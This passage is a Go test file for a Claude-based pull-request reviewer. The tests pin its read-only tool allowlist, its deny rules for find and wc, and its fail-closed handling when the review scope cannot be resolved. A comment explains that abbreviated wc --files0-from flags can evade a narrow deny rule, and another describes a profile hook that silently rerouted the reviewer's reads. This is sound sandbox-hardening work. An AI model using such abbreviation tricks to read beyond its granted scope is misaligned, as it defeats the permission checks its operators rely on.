package pruefer

import (
	"context"
	"os"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"testing"
	"time"

	gh "github.com/handarbeit/fabrik/github"
	"github.com/handarbeit/fabrik/pruefer/reviewplugin"
)

// reviewTestScope returns a request whose clone and staged diff directory
// really exist, so buildReviewArgs can resolve them.
func reviewTestScope(t *testing.T) ReviewRequest {
	t.Helper()
	dir := t.TempDir()
	staged, cleanup, err := stageDiff([]diffFileBlock{{Path: "a.go", Raw: "diff --git a/a.go b/a.go\n"}}, "", 1)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(cleanup)
	return ReviewRequest{Model: "sonnet", WorkDir: dir, Staged: staged}
}

func mustReviewArgs(t *testing.T, req ReviewRequest) []string {
	t.Helper()
	args, err := buildReviewArgs(req)
	if err != nil {
		t.Fatalf("buildReviewArgs: %v", err)
	}
	return args
}

func TestBuildReviewArgs_ReadOnlyAllowlist(t *testing.T) {
	req := reviewTestScope(t)
	args := mustReviewArgs(t, req)

	joined := strings.Join(args, " ")
	if !strings.Contains(joined, "--permission-mode dontAsk") {
		t.Errorf("args = %v, want --permission-mode dontAsk", args)
	}
	if strings.Contains(joined, "--dangerously-skip-permissions") {
		t.Errorf("args = %v, must never contain --dangerously-skip-permissions (Pruefer has no unrestricted opt-out)", args)
	}
	if strings.Contains(joined, "Bash(gh") {
		t.Error("allowlist must not contain gh — gh is not read-only (gh pr review --approve, gh pr merge)")
	}
	for _, banned := range []string{"Edit", "Write", "Bash(git", "Bash(sed", "Bash(rg", "Bash(find", "Bash(go "} {
		for i, a := range args {
			if a == "--allowedTools" && strings.HasPrefix(args[i+1], banned) {
				t.Errorf("allowlist must not contain %q rule %q", banned, args[i+1])
			}
		}
	}
	if err := checkReviewArgsScoped(args, reviewplugin.DefaultRef); err != nil {
		t.Errorf("built args are not scoped: %v", err)
	}
	clone, diff, err := resolveScopePaths(req.WorkDir, req.Staged.Dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"Read(//" + strings.TrimPrefix(clone, "/") + "/**)",
		"Grep(//" + strings.TrimPrefix(clone, "/") + "/**)",
		"Glob(//" + strings.TrimPrefix(clone, "/") + "/**)",
		"Read(//" + strings.TrimPrefix(diff, "/") + "/**)",
		"Grep(//" + strings.TrimPrefix(diff, "/") + "/**)",
		"Glob(//" + strings.TrimPrefix(diff, "/") + "/**)",
		"Bash(cat *)", "Bash(head *)", "Bash(tail *)", "Bash(ls *)", "Task",
	} {
		if !hasFlagValue(args, "--allowedTools", want) {
			t.Errorf("expected --allowedTools %q, args = %v", want, args)
		}
	}
	for _, want := range []string{"Bash(find *)", "Bash(wc *)"} {
		if !hasFlagValue(args, "--disallowedTools", want) {
			t.Errorf("expected --disallowedTools %q, args = %v", want, args)
		}
	}
	if !slices.Contains(args, "--model") {
		t.Errorf("expected --model to be passed when Model is set, args = %v", args)
	}
}

// wc has no allow rule and is denied outright: GNU wc accepts any unambiguous
// prefix of --files0-from, so a deny on the full spelling alone is bypassable.
func TestBuildReviewArgs_WcDeniedOutright(t *testing.T) {
	args, err := buildReviewArgs(reviewTestScope(t))
	if err != nil {
		t.Fatal(err)
	}
	if hasFlagValue(args, "--allowedTools", "Bash(wc *)") {
		t.Errorf("wc must not be allowed, args = %v", args)
	}
	if !hasFlagValue(args, "--disallowedTools", "Bash(wc *)") {
		t.Errorf("wc must be denied outright, args = %v", args)
	}
	for _, a := range args {
		if strings.Contains(a, "files0") {
			t.Errorf("a one-spelling files0 rule is bypassable by abbreviation: %q", a)
		}
	}
}

func hasFlagValue(args []string, flag, value string) bool {
	for i, a := range args {
		if a == flag && i+1 < len(args) && args[i+1] == value {
			return true
		}
	}
	return false
}

// TestBuildReviewArgs_NoBareReadGrepGlob pins R1: the bare tool names are an
// unscoped allow (every path), so they must never appear — not even next to
// the scoped rules.
func TestBuildReviewArgs_NoBareReadGrepGlob(t *testing.T) {
	args := mustReviewArgs(t, reviewTestScope(t))
	for i, a := range args {
		if a != "--allowedTools" {
			continue
		}
		switch args[i+1] {
		case "Read", "Grep", "Glob", "Bash":
			t.Errorf("bare %q allow is an unscoped grant", args[i+1])
		}
	}
}

// TestCheckReviewArgsScoped_NonVacuous proves the scope checker has teeth: it
// accepts the real args and rejects the pre-#2192 unscoped allowlist, and each
// single widening of the real args.
func TestCheckReviewArgsScoped_NonVacuous(t *testing.T) {
	good := mustReviewArgs(t, reviewTestScope(t))
	if err := checkReviewArgsScoped(good, reviewplugin.DefaultRef); err != nil {
		t.Fatalf("good args rejected: %v", err)
	}
	legacy := []string{"--permission-mode", "dontAsk"}
	for _, r := range []string{"Read", "Grep", "Glob", "Bash(git diff:*)", "Bash(git log:*)", "Bash(git show:*)", "Bash(git blame:*)", "Bash(git grep:*)", "Bash(git status:*)"} {
		legacy = append(legacy, "--allowedTools", r)
	}
	if checkReviewArgsScoped(legacy, reviewplugin.DefaultRef) == nil {
		t.Error("checker accepted the legacy unscoped allowlist")
	}
	for _, widen := range []string{"Read", "Bash(sed -n *)", "Bash(find *)", "Bash(go test:*)", "Edit", "WebFetch", "Skill"} {
		if checkReviewArgsScoped(append(slices.Clone(good), "--allowedTools", widen), reviewplugin.DefaultRef) == nil {
			t.Errorf("checker accepted widened allowlist with %q", widen)
		}
	}
	var noDeny []string
	for i := 0; i < len(good); i++ {
		if good[i] == "--disallowedTools" {
			i++
			continue
		}
		noDeny = append(noDeny, good[i])
	}
	if checkReviewArgsScoped(noDeny, reviewplugin.DefaultRef) == nil {
		t.Error("checker accepted args without the find deny rule")
	}
}

func TestBuildReviewArgs_NoStagedNoStagedRule(t *testing.T) {
	req := reviewTestScope(t)
	staged := req.Staged.Dir
	req.Staged = nil
	args := mustReviewArgs(t, req)
	for i, a := range args {
		if a == "--allowedTools" && strings.Contains(args[i+1], strings.TrimPrefix(staged, "/")) {
			t.Errorf("unexpected staged-dir rule %q with no Staged", args[i+1])
		}
	}
}

// TestBuildReviewArgs_StagedDirRulesNotSingleFile pins #2190: the diff is a
// directory scoped for Read, Grep and Glob, never the old single-file rule.
func TestBuildReviewArgs_StagedDirRulesNotSingleFile(t *testing.T) {
	req := reviewTestScope(t)
	args := mustReviewArgs(t, req)
	_, staged, err := resolveScopePaths(req.WorkDir, req.Staged.Dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, tool := range []string{"Read", "Grep", "Glob"} {
		if !hasFlagValue(args, "--allowedTools", tool+"(//"+strings.TrimPrefix(staged, "/")+"/**)") {
			t.Errorf("missing %s rule for the staged directory, args = %v", tool, args)
		}
	}
	for i, a := range args {
		if a == "--allowedTools" && strings.HasSuffix(args[i+1], ".diff)") {
			t.Errorf("single-file diff rule %q must be gone", args[i+1])
		}
	}
}

func TestBuildReviewArgs_ResolvesSymlinkedScope(t *testing.T) {
	real := t.TempDir()
	link := filepath.Join(t.TempDir(), "link")
	if err := os.Symlink(real, link); err != nil {
		t.Skip("symlinks unavailable")
	}
	args := mustReviewArgs(t, ReviewRequest{WorkDir: link})
	resolved, _ := filepath.EvalSymlinks(real)
	want := "Read(//" + strings.TrimPrefix(resolved, "/") + "/**)"
	if !hasFlagValue(args, "--allowedTools", want) {
		t.Errorf("want rule from the resolved path %q, args = %v", want, args)
	}
	if strings.Contains(strings.Join(args, " "), strings.TrimPrefix(link, "/")) {
		t.Errorf("rules must not name the unresolved symlink path: %v", args)
	}
}

func TestEscapeRulePath(t *testing.T) {
	cases := map[string]string{
		"/scope/plain":      "/scope/plain",
		"/scope/a[1]":       `/scope/a\[1\]`,
		"/scope/a*b?c":      `/scope/a\*b\?c`,
		"/scope/a(b)":       `/scope/a\(b\)`,
		"/scope/a!b":        `/scope/a\!b`,
		"#lead":             `\#lead`,
		"/scope/mid#dle":    "/scope/mid#dle",
		`/scope/back\slash`: `/scope/back\\slash`,
	}
	for in, want := range cases {
		if got := escapeRulePath(in); got != want {
			t.Errorf("escapeRulePath(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestResolveScopePaths_FailsClosed(t *testing.T) {
	for name, c := range map[string][2]string{
		"empty workdir":   {"", ""},
		"missing workdir": {filepath.Join(t.TempDir(), "nope"), ""},
		"missing staged":  {t.TempDir(), filepath.Join(t.TempDir(), "nope")},
	} {
		if _, _, err := resolveScopePaths(c[0], c[1]); err == nil {
			t.Errorf("%s: expected an error", name)
		}
		if _, err := buildReviewArgs(ReviewRequest{WorkDir: c[0], Staged: stagedAt(c[1])}); err == nil {
			t.Errorf("%s: buildReviewArgs must fail closed", name)
		}
	}
}

// TestReview_FailsClosedWithoutScope: Review must not invoke claude at all when
// the scope cannot be resolved.
func TestReview_FailsClosedWithoutScope(t *testing.T) {
	marker := filepath.Join(t.TempDir(), "ran")
	writeFakeClaude(t, "touch "+marker+"\n")
	r := &RealClaudeInvoker{}
	_, err := r.Review(context.Background(), ReviewRequest{PRNumber: 1, WorkDir: filepath.Join(t.TempDir(), "gone")})
	if err == nil {
		t.Fatal("expected an error for an unresolvable clone")
	}
	if _, statErr := os.Stat(marker); statErr == nil {
		t.Error("claude was invoked despite an unresolvable scope")
	}
}

// TestBuildReviewArgs_NoSettingSourcesLoaded pins that a review loads NO
// settings layer. This replaces TestBuildReviewArgs_UserSettingsOnly, which
// asserted "--setting-sources user" — the behavior deliberately changed, not
// a regression.
//
// Loading the operator's profile made every review depend on whichever
// CLAUDE_CONFIG_DIR the daemon inherited. Switching accounts silently rewired
// the reviewer: one profile carried a PreToolUse hook that proxied the
// reviewer's own git and file reads, plus "defaultMode": "auto" and an
// "effortLevel". Reviews degraded fleet-wide with nothing logged anywhere.
func TestBuildReviewArgs_NoSettingSourcesLoaded(t *testing.T) {
	args := mustReviewArgs(t, ReviewRequest{WorkDir: t.TempDir()})

	idx := -1
	for i, a := range args {
		if a == "--setting-sources" {
			idx = i
			break
		}
	}
	if idx < 0 {
		t.Fatalf("--setting-sources absent; the PR's own settings files would be loaded: %v", args)
	}
	if idx+1 >= len(args) {
		t.Fatalf("--setting-sources has no value: %v", args)
	}
	if got := args[idx+1]; got != "" {
		t.Errorf("--setting-sources = %q, want \"\" (load no settings layer)", got)
	}
}

// TestBuildReviewArgs_ExplicitControlsStillPassed: with no settings layer,
// everything governing the review must be passed on the command line, or
// removing the layer would silently drop it.
func TestBuildReviewArgs_ExplicitControlsStillPassed(t *testing.T) {
	args := mustReviewArgs(t, ReviewRequest{Model: "sonnet", WorkDir: t.TempDir()})
	joined := strings.Join(args, " ")
	for _, want := range []string{"--permission-mode dontAsk", "--model sonnet", "--allowedTools Read(//", "--disallowedTools Bash(find *)"} {
		if !strings.Contains(joined, want) {
			t.Errorf("args missing %q: %v", want, args)
		}
	}
}

func TestBuildReviewArgs_NoModelWhenUnset(t *testing.T) {
	args := mustReviewArgs(t, ReviewRequest{WorkDir: t.TempDir()})
	if slices.Contains(args, "--model") {
		t.Errorf("expected no --model flag when Model is empty, args = %v", args)
	}
}

func TestBuildReviewEnv_DefaultsEffort(t *testing.T) {
	env := buildReviewEnv(ReviewRequest{})
	joined := strings.Join(env, " ")
	if !strings.Contains(joined, "CLAUDE_CODE_EFFORT_LEVEL="+DefaultEffort) {
		t.Errorf("env = %v, want default effort %q", env, DefaultEffort)
	}
	if !strings.Contains(joined, "CLAUDE_CODE_DISABLE_ADAPTIVE_THINKING=1") {
		t.Errorf("env = %v, want adaptive thinking disabled", env)
	}
}

func TestBuildReviewEnv_HonorsExplicitEffort(t *testing.T) {
	env := buildReviewEnv(ReviewRequest{Effort: "max"})
	if !slices.Contains(env, "CLAUDE_CODE_EFFORT_LEVEL=max") {
		t.Errorf("env = %v, want CLAUDE_CODE_EFFORT_LEVEL=max", env)
	}
}

func TestBuildReviewEnv_ProfileOnlyWhenResolved(t *testing.T) {
	if env := buildReviewEnv(ReviewRequest{ClaudeConfigDir: "/p/B"}); !slices.Contains(env, "CLAUDE_CONFIG_DIR=/p/B") {
		t.Errorf("env = %v, want CLAUDE_CONFIG_DIR=/p/B", env)
	}
	for _, kv := range buildReviewEnv(ReviewRequest{}) {
		if strings.HasPrefix(kv, "CLAUDE_CONFIG_DIR") {
			t.Errorf("env holds %q with nothing resolved", kv)
		}
	}
}

func TestMergeEnv_OverridesTakePrecedence(t *testing.T) {
	base := []string{"FOO=old", "BAR=keep"}
	overrides := []string{"FOO=new"}
	got := mergeEnv(base, overrides)
	want := map[string]string{"FOO": "new", "BAR": "keep"}
	seen := map[string]string{}
	for _, kv := range got {
		parts := strings.SplitN(kv, "=", 2)
		seen[parts[0]] = parts[1]
	}
	for k, v := range want {
		if seen[k] != v {
			t.Errorf("seen[%q] = %q, want %q (full env: %v)", k, seen[k], v, got)
		}
	}
}

func TestParseClaudeReviewJSON_SingleObject(t *testing.T) {
	resp, ok := parseClaudeReviewJSON([]byte(`{"result":"looks good, minor nit on line 4","is_error":false}`))
	if !ok {
		t.Fatal("expected ok=true")
	}
	if resp.Result != "looks good, minor nit on line 4" {
		t.Errorf("Result = %q", resp.Result)
	}
	if resp.IsError {
		t.Error("IsError = true, want false")
	}
}

func TestParseClaudeReviewJSON_ConversationArray(t *testing.T) {
	stream := `{"type":"system","subtype":"init"}
{"type":"assistant","message":{"content":[{"type":"text","text":"thinking..."}]}}
{"type":"result","result":"final review text","is_error":false,"num_turns":4,"total_cost_usd":0.0567}`
	resp, ok := parseClaudeReviewJSON([]byte(stream))
	if !ok {
		t.Fatal("expected ok=true")
	}
	if resp.Result != "final review text" {
		t.Errorf("Result = %q", resp.Result)
	}
	if resp.NumTurns != 4 {
		t.Errorf("NumTurns = %d, want 4 (NDJSON envelope path must carry turns through)", resp.NumTurns)
	}
	if resp.CostUSD != 0.0567 {
		t.Errorf("CostUSD = %v, want 0.0567 (NDJSON envelope path must carry cost through)", resp.CostUSD)
	}
}

func TestParseClaudeReviewJSON_Unparseable(t *testing.T) {
	_, ok := parseClaudeReviewJSON([]byte("not json at all"))
	if ok {
		t.Error("expected ok=false for unparseable output")
	}
}

// writeFakeClaude installs a fake "claude" binary on a temp bin dir added to
// PATH, mirroring engine/grandchild_test.go's pattern. The script reads and
// discards stdin (the prompt), then emits the given stdout.
func writeFakeClaude(t *testing.T, script string) {
	t.Helper()
	if runtime.GOOS == "windows" {
		t.Skip("fake claude script uses #!/bin/sh")
	}
	binDir := t.TempDir()
	fakeClaude := filepath.Join(binDir, "claude")
	if err := os.WriteFile(fakeClaude, []byte("#!/bin/sh\ncat >/dev/null\n"+script), 0755); err != nil {
		t.Fatalf("writing fake claude script: %v", err)
	}
	t.Setenv("PATH", binDir+":"+os.Getenv("PATH"))
}

func TestRealClaudeInvoker_Review_Success(t *testing.T) {
	writeFakeClaude(t, `printf '%s\n' '{"type":"result","result":"Found one bug: nil check missing on line 12.","is_error":false,"num_turns":7,"total_cost_usd":0.1234}'`+"\n")

	r := &RealClaudeInvoker{}
	workDir := t.TempDir()
	result, err := r.Review(context.Background(), ReviewRequest{
		Owner: "handarbeit", Repo: "fabrik", PRNumber: 1, Title: "Fix bug",
		HeadSHA: "abc123", WorkDir: workDir,
	})
	if err != nil {
		t.Fatalf("Review: %v", err)
	}
	if result.Text != "Found one bug: nil check missing on line 12." {
		t.Errorf("Text = %q", result.Text)
	}
	if result.NumTurns != 7 {
		t.Errorf("NumTurns = %d, want 7", result.NumTurns)
	}
	if result.CostUSD != 0.1234 {
		t.Errorf("CostUSD = %v, want 0.1234", result.CostUSD)
	}
}

// #2303: Review hands the invocation's raw stdout back, byte for byte, so
// ReviewPR can keep it when coverage is partial.
func TestRealClaudeInvoker_Review_ReturnsRawTranscript(t *testing.T) {
	const stream = `{"type":"system","subtype":"init"}` + "\n" +
		`{"type":"assistant","parent_tool_use_id":null,"message":{"content":[{"type":"tool_use","id":"t1","name":"Skill","input":{"skill":"pruefer-review:review"}}]}}` + "\n" +
		`{"type":"result","result":"ok","is_error":false,"num_turns":1,"total_cost_usd":0.01}` + "\n"
	writeFakeClaude(t, "printf '%s\\n' '{\"type\":\"system\",\"subtype\":\"init\"}' '{\"type\":\"assistant\",\"parent_tool_use_id\":null,\"message\":{\"content\":[{\"type\":\"tool_use\",\"id\":\"t1\",\"name\":\"Skill\",\"input\":{\"skill\":\"pruefer-review:review\"}}]}}' '{\"type\":\"result\",\"result\":\"ok\",\"is_error\":false,\"num_turns\":1,\"total_cost_usd\":0.01}'\n")

	r := &RealClaudeInvoker{}
	result, err := r.Review(context.Background(), ReviewRequest{
		Owner: "o", Repo: "r", PRNumber: 1, HeadSHA: "abc", WorkDir: t.TempDir(),
	})
	if err != nil {
		t.Fatalf("Review: %v", err)
	}
	if string(result.Transcript) != stream {
		t.Errorf("Transcript = %q, want %q", result.Transcript, stream)
	}
}

func TestRealClaudeInvoker_Review_ProcessError(t *testing.T) {
	writeFakeClaude(t, "exit 1\n")

	r := &RealClaudeInvoker{}
	_, err := r.Review(context.Background(), ReviewRequest{PRNumber: 1, WorkDir: t.TempDir()})
	if err == nil {
		t.Fatal("expected an error when claude exits non-zero")
	}
}

func TestRealClaudeInvoker_Review_IsErrorResponse(t *testing.T) {
	writeFakeClaude(t, `printf '%s\n' '{"type":"result","result":"something went wrong internally","is_error":true}'`+"\n")

	r := &RealClaudeInvoker{}
	_, err := r.Review(context.Background(), ReviewRequest{PRNumber: 1, WorkDir: t.TempDir()})
	if err == nil {
		t.Fatal("expected an error when claude reports is_error=true")
	}
}

func TestRealClaudeInvoker_Review_UnparseableOutput(t *testing.T) {
	writeFakeClaude(t, `printf 'not json\n'`+"\n")

	r := &RealClaudeInvoker{}
	_, err := r.Review(context.Background(), ReviewRequest{PRNumber: 1, WorkDir: t.TempDir()})
	if err == nil {
		t.Fatal("expected an error when claude's output cannot be parsed")
	}
}

func TestRealClaudeInvoker_Review_InactivityTimeout(t *testing.T) {
	orig := reviewInactivityTimeout
	reviewInactivityTimeout = 100 * time.Millisecond
	defer func() { reviewInactivityTimeout = orig }()

	// The fake claude script hangs (sleeps) without producing any stdout —
	// the inactivity watchdog must kill it well before the test timeout.
	writeFakeClaude(t, "sleep 30\n")

	r := &RealClaudeInvoker{}
	done := make(chan error, 1)
	go func() {
		_, err := r.Review(context.Background(), ReviewRequest{PRNumber: 1, WorkDir: t.TempDir()})
		done <- err
	}()
	select {
	case err := <-done:
		if err == nil {
			t.Error("expected an error when claude is killed for inactivity")
		}
	case <-time.After(10 * time.Second):
		t.Fatal("Review did not return within 10s — inactivity watchdog did not fire")
	}
}

func TestRealClaudeInvoker_Review_ContextCancelKillsProcess(t *testing.T) {
	origGrace := reviewKillGrace
	reviewKillGrace = 200 * time.Millisecond
	defer func() { reviewKillGrace = origGrace }()

	writeFakeClaude(t, "trap '' INT TERM\nsleep 30\n") // ignores SIGINT/SIGTERM so the test also exercises the SIGKILL escalation step

	r := &RealClaudeInvoker{}
	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan error, 1)
	go func() {
		_, err := r.Review(ctx, ReviewRequest{PRNumber: 1, WorkDir: t.TempDir()})
		done <- err
	}()
	time.Sleep(100 * time.Millisecond)
	cancel()
	select {
	case err := <-done:
		if err == nil {
			t.Error("expected an error when the context is cancelled mid-invocation")
		}
	case <-time.After(10 * time.Second):
		t.Fatal("Review did not return within 10s of context cancellation")
	}
}

func TestMockClaudeInvoker_RecordsCalls(t *testing.T) {
	m := &mockClaudeInvoker{}
	req := ReviewRequest{PRNumber: 7}
	result, err := m.Review(context.Background(), req)
	if err != nil {
		t.Fatalf("Review: %v", err)
	}
	if result.Text != "mock review" {
		t.Errorf("Text = %q, want default mock review text", result.Text)
	}
	if m.callCount() != 1 {
		t.Errorf("callCount = %d, want 1", m.callCount())
	}
	if got := m.callsSnapshot()[0].PRNumber; got != 7 {
		t.Errorf("recorded PRNumber = %d, want 7", got)
	}
}

// TestBuildReviewPrompt_RendersThreadFileLineBodyResolutionState pins AC1: a
// thread's file, line, body, and resolution state must all be present in the
// assembled prompt.
func TestBuildReviewPrompt_RendersThreadFileLineBodyResolutionState(t *testing.T) {
	req := ReviewRequest{
		Owner: "owner", Repo: "repo", PRNumber: 1, Title: "t",
		ReviewThreads: []gh.PRReviewThread{
			{Path: "engine/claude.go", Line: 954, IsResolved: false, Comments: []gh.PRReviewThreadComment{
				{Author: "pruefer-bot", Body: "ArchiveProjectItem bumps updatedAt on a re-archive no-op"},
			}},
			{Path: "engine/worktree.go", Line: 12, IsResolved: true, Comments: []gh.PRReviewThreadComment{
				{Author: "pruefer-bot", Body: "withWorktree omits worktree prune"},
				{Author: "alice", Body: "fixed in a0b1c2"},
			}},
		},
	}
	prompt := buildReviewPrompt(req)

	if !strings.Contains(prompt, "engine/claude.go:954") {
		t.Error("expected the open thread's file:line in the prompt")
	}
	if !strings.Contains(prompt, "[OPEN]") {
		t.Error("expected an [OPEN] resolution-state tag")
	}
	if !strings.Contains(prompt, "ArchiveProjectItem bumps updatedAt on a re-archive no-op") {
		t.Error("expected the open thread's body text in the prompt")
	}
	if !strings.Contains(prompt, "engine/worktree.go:12") {
		t.Error("expected the resolved thread's file:line in the prompt")
	}
	if !strings.Contains(prompt, "[RESOLVED]") {
		t.Error("expected a [RESOLVED] resolution-state tag")
	}
	if !strings.Contains(prompt, "withWorktree omits worktree prune") {
		t.Error("expected the resolved thread's original body text in the prompt")
	}
	if !strings.Contains(prompt, "fixed in a0b1c2") {
		t.Error("expected the resolved thread's reply text in the prompt")
	}
}

// TestBuildReviewPrompt_TruncatedThreadCommentsNotedInPrompt pins the
// per-thread comment-truncation signal (github.PRReviewThread.CommentsTruncated):
// when a thread's fetched comments are only a partial history, the prompt
// must say so rather than presenting it as complete.
func TestBuildReviewPrompt_TruncatedThreadCommentsNotedInPrompt(t *testing.T) {
	req := ReviewRequest{
		ReviewThreads: []gh.PRReviewThread{
			{Path: "a.go", Line: 1, CommentsTruncated: true, Comments: []gh.PRReviewThreadComment{
				{Author: "x", Body: "finding"},
			}},
			{Path: "b.go", Line: 2, CommentsTruncated: false, Comments: []gh.PRReviewThreadComment{
				{Author: "x", Body: "other finding"},
			}},
		},
	}
	prompt := buildReviewPrompt(req)

	if !strings.Contains(prompt, "may be missing") {
		t.Errorf("expected a truncation note in the prompt for the truncated thread, got:\n%s", prompt)
	}
	if strings.Count(prompt, "may be missing") != 1 {
		t.Errorf("expected exactly 1 truncation note (only a.go's thread is truncated), got %d, prompt:\n%s", strings.Count(prompt, "may be missing"), prompt)
	}
}

// TestBuildReviewPrompt_LongCommentBodyTruncated pins R4's per-comment bound:
// a single comment body larger than maxThreadCommentBodyChars is truncated
// with an inline note, rather than flowing into the prompt unbounded.
func TestBuildReviewPrompt_LongCommentBodyTruncated(t *testing.T) {
	longBody := strings.Repeat("x", maxThreadCommentBodyChars+500)
	req := ReviewRequest{
		ReviewThreads: []gh.PRReviewThread{
			{Path: "a.go", Line: 1, Comments: []gh.PRReviewThreadComment{
				{Author: "x", Body: longBody},
			}},
		},
	}
	prompt := buildReviewPrompt(req)

	if strings.Contains(prompt, longBody) {
		t.Error("expected the long comment body to be truncated, not rendered in full")
	}
	if !strings.Contains(prompt, "truncated, 500 more characters") {
		t.Errorf("expected a truncation note naming the omitted character count, prompt = %s", prompt)
	}
}

// TestBuildReviewPrompt_ShortCommentBodyNotTruncated proves the truncation
// note only appears when a body actually exceeds the bound.
func TestBuildReviewPrompt_ShortCommentBodyNotTruncated(t *testing.T) {
	req := ReviewRequest{
		ReviewThreads: []gh.PRReviewThread{
			{Path: "a.go", Line: 1, Comments: []gh.PRReviewThreadComment{
				{Author: "x", Body: "a short finding"},
			}},
		},
	}
	prompt := buildReviewPrompt(req)

	if !strings.Contains(prompt, "a short finding") {
		t.Errorf("expected the short body to render verbatim, prompt = %s", prompt)
	}
	if strings.Contains(prompt, "truncated") {
		t.Errorf("expected no truncation note for a body under the bound, prompt = %s", prompt)
	}
}

// TestBuildReviewPrompt_NoThreads_OmitsThreadSection proves the AC1 test
// above is non-vacuous (AC6): with ReviewThreads empty/absent, none of the
// thread markers appear.
func TestBuildReviewPrompt_NoThreads_OmitsThreadSection(t *testing.T) {
	req := ReviewRequest{Owner: "owner", Repo: "repo", PRNumber: 1, Title: "t"}
	prompt := buildReviewPrompt(req)

	if strings.Contains(prompt, "## Existing review threads") {
		t.Error("expected no thread section when ReviewThreads is empty")
	}
	if strings.Contains(prompt, "[OPEN]") || strings.Contains(prompt, "[RESOLVED]") {
		t.Error("expected no resolution-state tags when ReviewThreads is empty")
	}
}

// TestBuildReviewPrompt_UnderCap_NoOmissionStatement pins the AC4 boundary:
// a thread count at or under maxPromptThreads produces no omission line.
func TestBuildReviewPrompt_UnderCap_NoOmissionStatement(t *testing.T) {
	threads := make([]gh.PRReviewThread, maxPromptThreads)
	for i := range threads {
		threads[i] = gh.PRReviewThread{Path: "a.go", Line: i + 1, Comments: []gh.PRReviewThreadComment{{Author: "x", Body: "finding"}}}
	}
	prompt := buildReviewPrompt(ReviewRequest{ReviewThreads: threads})

	if strings.Contains(prompt, "omitted") {
		t.Errorf("expected no omission statement at exactly the cap (%d threads)", maxPromptThreads)
	}
	if strings.Count(prompt, "a.go:") != maxPromptThreads {
		t.Errorf("expected all %d threads rendered, prompt = %s", maxPromptThreads, prompt)
	}
}

// TestBuildReviewPrompt_OverCap_BoundedWithOmissionStatement pins AC4: a PR
// with more threads than the cap produces a bounded prompt (at most
// maxPromptThreads rendered) that states what was omitted.
func TestBuildReviewPrompt_OverCap_BoundedWithOmissionStatement(t *testing.T) {
	threads := make([]gh.PRReviewThread, maxPromptThreads+10)
	for i := range threads {
		threads[i] = gh.PRReviewThread{Path: "a.go", Line: i + 1, Comments: []gh.PRReviewThreadComment{{Author: "x", Body: "finding"}}}
	}
	prompt := buildReviewPrompt(ReviewRequest{ReviewThreads: threads})

	if strings.Count(prompt, "a.go:") != maxPromptThreads {
		t.Errorf("expected exactly %d threads rendered, got %d occurrences", maxPromptThreads, strings.Count(prompt, "a.go:"))
	}
	if !strings.Contains(prompt, "10 additional thread") {
		t.Errorf("expected an omission statement naming the omitted count (10), prompt = %s", prompt)
	}
}

// TestBuildReviewPrompt_ThreadsTruncated_NotesFetchLayerOmission covers the
// #1497 review finding: when the fetch layer itself couldn't return every
// thread on the PR (ReviewThreadsTruncated), the prompt must say so —
// distinct from selectPromptThreads' own prompt-level cap note — so a PR
// that has grown past FetchPRReviewThreads' page size doesn't look complete.
func TestBuildReviewPrompt_ThreadsTruncated_NotesFetchLayerOmission(t *testing.T) {
	threads := []gh.PRReviewThread{
		{Path: "a.go", Line: 1, Comments: []gh.PRReviewThreadComment{{Author: "x", Body: "finding"}}},
	}
	prompt := buildReviewPrompt(ReviewRequest{ReviewThreads: threads, ReviewThreadsTruncated: true})

	if !strings.Contains(prompt, "more review threads than could be fetched") {
		t.Errorf("expected a fetch-layer truncation note, prompt = %s", prompt)
	}
}

// TestBuildReviewPrompt_ThreadsNotTruncated_NoFetchLayerNote is the negative
// case: ReviewThreadsTruncated false must not produce the fetch-layer note.
func TestBuildReviewPrompt_ThreadsNotTruncated_NoFetchLayerNote(t *testing.T) {
	threads := []gh.PRReviewThread{
		{Path: "a.go", Line: 1, Comments: []gh.PRReviewThreadComment{{Author: "x", Body: "finding"}}},
	}
	prompt := buildReviewPrompt(ReviewRequest{ReviewThreads: threads, ReviewThreadsTruncated: false})

	if strings.Contains(prompt, "more review threads than could be fetched") {
		t.Errorf("expected no fetch-layer truncation note, prompt = %s", prompt)
	}
}

// TestSelectPromptThreads_PrioritizesUnresolvedThenNonOutdated pins the R4
// ordering policy: under the cap, resolved threads are dropped before
// unresolved ones, and outdated threads before current ones within a group.
func TestSelectPromptThreads_PrioritizesUnresolvedThenNonOutdated(t *testing.T) {
	older := time.Now().Add(-time.Hour)
	newer := time.Now()
	threads := []gh.PRReviewThread{
		{Path: "resolved.go", IsResolved: true, Comments: []gh.PRReviewThreadComment{{CreatedAt: newer}}},
		{Path: "outdated.go", IsResolved: false, IsOutdated: true, Comments: []gh.PRReviewThreadComment{{CreatedAt: newer}}},
		{Path: "current-old.go", IsResolved: false, Comments: []gh.PRReviewThreadComment{{CreatedAt: older}}},
		{Path: "current-new.go", IsResolved: false, Comments: []gh.PRReviewThreadComment{{CreatedAt: newer}}},
	}
	selected, omitted := selectPromptThreads(threads, 3)
	if omitted != 1 {
		t.Fatalf("omitted = %d, want 1", omitted)
	}
	if len(selected) != 3 {
		t.Fatalf("selected = %d threads, want 3", len(selected))
	}
	if selected[0].Path != "current-new.go" || selected[1].Path != "current-old.go" || selected[2].Path != "outdated.go" {
		t.Errorf("selected order = %v, want [current-new current-old outdated] (resolved.go dropped)", selected)
	}
}

// TestBuildReviewPrompt_ContainsR2PolicyText pins AC2: the R2 policy text
// governing how the reviewer must treat prior threads is present.
func TestBuildReviewPrompt_ContainsR2PolicyText(t *testing.T) {
	req := ReviewRequest{ReviewThreads: []gh.PRReviewThread{
		{Path: "a.go", Line: 1, Comments: []gh.PRReviewThreadComment{{Author: "x", Body: "finding"}}},
	}}
	prompt := buildReviewPrompt(req)

	for _, want := range []string{"do not raise a finding that restates an [OPEN] thread", "Do not restate a [RESOLVED] thread unless"} {
		if !strings.Contains(prompt, want) {
			t.Errorf("expected R2 policy text %q in prompt, got:\n%s", want, prompt)
		}
	}
}

// TestBuildReviewPrompt_ContainsR5RevisedNitpickInstruction pins R5: the
// prompt raises the bar for a low-severity finding beyond "skip nitpicks".
func TestBuildReviewPrompt_ContainsR5RevisedNitpickInstruction(t *testing.T) {
	// #2306: the instruction lives in the review skill, not the prompt.
	body, err := reviewplugin.SkillBody()
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(body, "raise the bar for a \"low\"-severity finding") {
		t.Errorf("expected the R5 raised-bar instruction in the review skill, got:\n%s", body)
